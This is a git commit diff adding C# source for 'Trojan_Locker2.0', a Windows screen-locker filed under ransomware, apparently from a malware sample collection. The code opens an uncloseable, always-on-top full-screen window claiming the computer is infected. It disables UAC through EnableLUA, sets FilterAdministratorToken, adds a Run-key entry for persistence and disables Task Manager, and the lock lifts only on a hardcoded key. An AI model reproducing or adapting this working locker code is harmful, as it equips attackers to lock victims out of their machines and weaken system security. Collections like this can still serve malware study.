caedb173d1e6d6556064b15d279b156b326f5281
petikvx <petikvx@gmail.com>
2022-09-14 11:23:56 +0200

    Trojan_Locker2.0
    https://github.com/MalwareStudio/Trojan_Locker2.0

---
+++ Binary/Ransomware/Trojan_Locker2.0/blue_skull/blue_skull/blue_skull2.Designer.cs
@@ -0,0 +1,129 @@
+﻿namespace blue_skull
+{
+    partial class blue_skull2
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(blue_skull2));
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.BackColor = System.Drawing.Color.Black;
+            this.label1.Font = new System.Drawing.Font("Arial Black", 26.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label1.ForeColor = System.Drawing.Color.Navy;
+            this.label1.Location = new System.Drawing.Point(579, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(742, 50);
+            this.label1.TabIndex = 5;
+            this.label1.Text = "YOUR COMPUTER HAS BE INFECTED!";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.BackColor = System.Drawing.Color.Black;
+            this.label2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.label2.Font = new System.Drawing.Font("Arial Black", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label2.ForeColor = System.Drawing.Color.Navy;
+            this.label2.Location = new System.Drawing.Point(791, 855);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(353, 35);
+            this.label2.TabIndex = 6;
+            this.label2.Text = "WRITE KEY FOR UNLOCK";
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.Color.Black;
+            this.textBox1.Font = new System.Drawing.Font("Arial Black", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.textBox1.ForeColor = System.Drawing.Color.Aqua;
+            this.textBox1.Location = new System.Drawing.Point(815, 893);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(303, 37);
+            this.textBox1.TabIndex = 7;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.Black;
+            this.button1.Font = new System.Drawing.Font("Arial Black", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.button1.ForeColor = System.Drawing.Color.Navy;
+            this.button1.Location = new System.Drawing.Point(815, 936);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(303, 44);
+            this.button1.TabIndex = 8;
+            this.button1.Text = "UNLOCK";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click_1);
+            // 
+            // timer1
+            // 
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // blue_skull2
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Black;
+            this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(1920, 1080);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.DoubleBuffered = true;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "blue_skull2";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.Text = "blue_skull2";
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.blue_skull2_FormClosing);
+            this.Load += new System.EventHandler(this.blue_skull2_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Timer timer1;
+    }
+}
---
+++ Binary/Ransomware/Trojan_Locker2.0/blue_skull/blue_skull/blue_skull2.cs
@@ -0,0 +1,118 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Media; //please add
+using Microsoft.Win32; //please add
+using System.Diagnostics; //please add
+using System.Runtime.InteropServices;
+
+namespace blue_skull
+{
+    public partial class blue_skull2 : Form
+    {
+     
+
+
+        private SoundPlayer _soundplayer; //defines music
+        public blue_skull2()
+        {
+            InitializeComponent();
+            _soundplayer = new SoundPlayer("C:\\norm9.wav"); //path for music(must be .wav)
+        }
+
+        private void blue_skull2_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true; //Anti close
+        }
+
+        private void blue_skull2_Load(object sender, EventArgs e)
+        {
+
+
+
+
+            timer1.Start();
+            _soundplayer.Play(); //Turn on music
+            //the same registry settings as in the first section
+            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+            rk.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
+
+            RegistryKey rg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+            rg.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
+
+            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            reg.SetValue("blue_skull", Application.ExecutablePath.ToString());
+
+            RegistryKey fk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+            fk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+
+        }
+
+
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+
+            //condition for the button
+
+            if (textBox1.Text == "") //if the user does not fill in anything
+            {
+                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error); //command
+
+            }
+            else if (textBox1.Text == "672349276") //if it writes the correct code
+            {
+                //commands for setting the registry in the default settings and the program shuts down at the end
+
+                ProcessStartInfo kokot = new ProcessStartInfo();
+                kokot.FileName = "cmd.exe";
+                kokot.WindowStyle = ProcessWindowStyle.Hidden;
+                kokot.Arguments = @"/k start explorer.exe";
+                Process.Start(kokot);
+
+                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+                rk.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
+
+                RegistryKey key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+                key.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
+
+                RegistryKey fk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+                fk.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
+
+                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                reg.SetValue("blue_skull", 0, RegistryValueKind.String);
+                Process[] _proceses = null;
+                _proceses = Process.GetProcessesByName("Trojan_Locker");
+                foreach (Process proces in _proceses)
+                {
+                    proces.Kill();
+                }
+                this.Close();
+            }
+            else //if it writes the wrong code
+            {
+                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error); //command
+            }
+
+        }
+
+        
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            
+        }
+
+    }
+}
